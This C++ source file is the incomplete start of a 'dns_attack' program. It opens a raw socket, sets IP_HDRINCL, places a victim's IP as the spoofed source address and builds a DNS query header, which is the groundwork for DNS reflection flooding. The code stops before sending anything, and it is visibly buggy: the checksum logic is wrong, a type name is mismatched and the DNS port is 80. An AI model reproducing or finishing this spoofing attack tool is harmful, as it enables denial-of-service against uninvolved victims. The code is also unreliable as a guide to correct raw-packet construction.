#include <iostream>
#include <cstdlib>
#include <cstring>

#include <sys/socket.h>
#include <arpa/inet.h>    // inet_addr
#include <netinet/ip.h>   // Provides declarations for ip header
#include <netinet/udp.h>  // Provides declarations for udp header
using namespace std;

// Checksum (from internet)
unsigned char checksum(unsigned char *buf, int len){
    unsigned long sum = 0xffff;

    while (len > 1){
        sum += *buf;
        buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*) buf;

    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

void socket_init(int& sock_r) {
    sock_r = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    if (sock_r < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
    int one = 1;
    if (setsockopt(sock_r, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cout << "Fail to Set IP_HDRINCL\n";
        exit(2);
    } else
        cout << "Success to set IP_HDRINCL\n";
}

struct dns_hdr {

    unsigned short id;      // ID
    unsigned short flags;   // DNS Flags

    unsigned short qcnt;    // Question Count
    unsigned short acnt;    // Answer Count

    unsigned short auth;    // Authority RR
    unsigned short add;     // Additional RR

};

/* Command
$ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>
*/

void construct_dns_hdr(struct dns_hdr* h) {
    h -> id = 0x7419;
    h -> flags = 0x0100;

    h -> qcnt = 0x0001;
    h -> acnt = 0x0000;

    h -> auth = 0x0000;
    h -> add  = 0x0000;
}

int main(int argc, char const *argv[]) {

    int sock_r;
    socket_init(sock_r);

    struct sockaddr_in addr;

    // DNS IP setting
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(80);
    addr.sin_addr.s_addr = inet_addr(argv[3]);

    char source_ip[32];
    strcpy(source_ip, argv[1]);


    char datagram[4096], *data;
    memset(datagram, 0, 4096);

    struct iphdr  *ip_header  = (struct iphdr*  ) (datagram);
    struct udphdr *udp_header = (struct udphdr* ) (datagram + sizeof(struct iphdr));
    struct dnshdr *dns_header = (struct dns_hdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_hdr);

    construct_dns_hdr(dns_header);




    return 0;
}
